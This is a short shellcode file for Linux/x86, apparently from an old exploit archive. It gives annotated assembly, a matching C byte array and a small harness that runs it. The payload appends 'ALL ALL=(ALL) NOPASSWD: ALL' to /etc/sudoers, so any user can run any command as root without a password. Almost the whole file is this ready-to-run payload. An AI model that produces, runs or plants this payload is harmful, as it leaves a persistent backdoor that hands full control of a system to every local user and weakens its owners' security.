/*
Author: Rick
Email: rick2600@hotmail.com

OS: Linux/x86
Description: Anyone can run sudo without password

section .text
	global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax
	push eax
	push 0x7372656f
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp
	mov cx, 0x401
	mov al, 0x05
	int 0x80

	mov ebx, eax

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax
	push eax
	push 0x0a4c4c41
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp
	mov dl, 0x1c
	mov al, 0x04
	int 0x80

	;close(file)
	mov al, 0x06
	int 0x80

	;exit(0);
	xor ebx, ebx
	mov al, 0x01
	int 0x80

*/

#include <stdio.h>
#include <string.h>

char code[] =
"\x31\xc0\x50\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64"
"\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xb0\x05"
"\xcd\x80\x89\xc3\x31\xc0\x50\x68\x41\x4c\x4c\x0a\x68"
"\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e"
"\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41"
"\x4c\x4c\x20\x89\xe1\xb2\x1c\xb0\x04\xcd\x80\xb0\x06"
"\xcd\x80\x31\xdb\xb0\x01\xcd\x80";

void main(void) {

	void (*shellcode)() = code;
	shellcode();

}

// milw0rm.com [2008-11-19]